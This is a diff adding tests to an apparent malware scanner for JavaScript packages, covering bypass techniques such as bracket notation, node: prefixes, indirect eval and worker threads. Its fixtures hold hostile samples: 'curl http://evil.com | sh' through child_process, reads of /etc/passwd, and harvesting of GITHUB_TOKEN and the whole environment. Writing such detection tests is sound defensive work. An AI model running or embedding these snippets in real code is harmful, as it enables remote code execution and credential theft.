@@ -1173,6 +1173,182 @@ const client = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
       assert(!t, 'process.binding("constants") should NOT trigger process_binding_abuse');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- Batch 2: AST bypass fixes ---
+
+  // Fix 1: node: prefix normalization
+  await asyncTest('AST-B2: obj.cp = require("node:child_process") — detected via node: prefix normalization', async () => {
+    const tmp = makeTempPkg(`
+const obj = {};
+obj.cp = require('node:child_process');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dynamic_require' && t.message.includes('hiding dangerous module'));
+      assert(t, 'obj.cp = require("node:child_process") should be detected as dangerous module indirection');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST-B2: import("node:fs") — detected via node: prefix normalization', async () => {
+    const tmp = makeTempPkg(`
+async function steal() {
+  const fs = await import('node:fs');
+  return fs.readFileSync('/etc/passwd');
+}
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dynamic_import');
+      assert(t, 'import("node:fs") should be detected as dynamic_import');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST-B2: require("node:path") — NOT flagged (safe module)', async () => {
+    const tmp = makeTempPkg(`const p = require('node:path'); p.join('a', 'b');`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dynamic_require' && t.message.includes('node:path'));
+      assert(!t, 'require("node:path") should NOT be flagged');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Fix 2: Bracket notation
+  await asyncTest('AST-B2: cp["exec"]("curl | sh") — detected via bracket notation', async () => {
+    const tmp = makeTempPkg(`
+const cp = require('child_process');
+cp['exec']('curl http://evil.com | sh');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_exec');
+      assert(t, 'cp["exec"]("curl | sh") should be detected as dangerous_exec via bracket notation');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST-B2: cp["execSync"]("cmd") — detected via bracket notation', async () => {
+    const tmp = makeTempPkg(`
+const cp = require('child_process');
+cp['execSync']('curl http://evil.com | sh');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_exec');
+      assert(t, 'cp["execSync"]("curl | sh") should be detected as dangerous_exec');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Fix 3: LogicalExpression indirect eval
+  await asyncTest('AST-B2: (false || eval)("code") — detected as indirect eval', async () => {
+    const tmp = makeTempPkg(`const x = "process.env.SECRET"; (false || eval)(x);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.message.includes('logical expression'));
+      assert(t, '(false || eval)() should be detected as dangerous_call_eval');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST-B2: (0 || Function)("return 1") — detected as indirect Function', async () => {
+    const tmp = makeTempPkg(`const fn = (0 || Function)("return 1"); fn();`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_call_function' && t.message.includes('logical expression'));
+      assert(t, '(0 || Function)() should be detected as dangerous_call_function');
+      assert(t.severity === 'MEDIUM', 'Should be MEDIUM severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST-B2: (config || defaultFn)() — NOT flagged (normal pattern)', async () => {
+    const tmp = makeTempPkg(`
+const config = null;
+const defaultFn = () => 42;
+const result = (config || defaultFn)();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.message && t.message.includes('logical expression'));
+      assert(!t, '(config || defaultFn)() should NOT trigger logical expression detection');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Fix 4: process.env destructuring
+  await asyncTest('AST-B2: const { GITHUB_TOKEN } = process.env — detected', async () => {
+    const tmp = makeTempPkg(`const { GITHUB_TOKEN } = process.env;`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_access' && t.message.includes('Destructured'));
+      assert(t, 'const { GITHUB_TOKEN } = process.env should be detected as env_access');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST-B2: const { ...all } = process.env — detected as env harvesting', async () => {
+    const tmp = makeTempPkg(`const { ...all } = process.env;`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_harvesting_dynamic' && t.message.includes('rest destructuring'));
+      assert(t, 'const { ...all } = process.env should be detected as env_harvesting_dynamic');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST-B2: const { NODE_ENV } = process.env — NOT flagged (safe var)', async () => {
+    const tmp = makeTempPkg(`const { NODE_ENV } = process.env;`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_access' && t.message.includes('Destructured'));
+      assert(!t, 'const { NODE_ENV } = process.env should NOT be flagged');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST-B2: const { x } = config — NOT flagged (non-env object)', async () => {
+    const tmp = makeTempPkg(`const config = { x: 1 }; const { x } = config;`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.message && t.message.includes('Destructured'));
+      assert(!t, 'const { x } = config should NOT trigger destructuring detection');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Fix 5: worker_threads
+  await asyncTest('AST-B2: new Worker(code, { eval: true }) — detected', async () => {
+    const tmp = makeTempPkg(`
+const { Worker } = require('worker_threads');
+const code = 'require("child_process").execSync("whoami")';
+new Worker(code, { eval: true });
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'worker_thread_exec');
+      assert(t, 'new Worker(code, {eval:true}) should be detected as worker_thread_exec');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST-B2: import("worker_threads") — detected as dynamic_import', async () => {
+    const tmp = makeTempPkg(`
+async function run() {
+  const wt = await import('worker_threads');
+  new wt.Worker('code', { eval: true });
+}
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dynamic_import' && t.message.includes('worker_threads'));
+      assert(t, 'import("worker_threads") should be detected as dynamic_import');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST-B2: new Worker("./file.js") — NOT flagged (no eval:true)', async () => {
+    const tmp = makeTempPkg(`
+const { Worker } = require('worker_threads');
+new Worker('./worker.js');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'worker_thread_exec');
+      assert(!t, 'new Worker("./file.js") without eval:true should NOT trigger');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
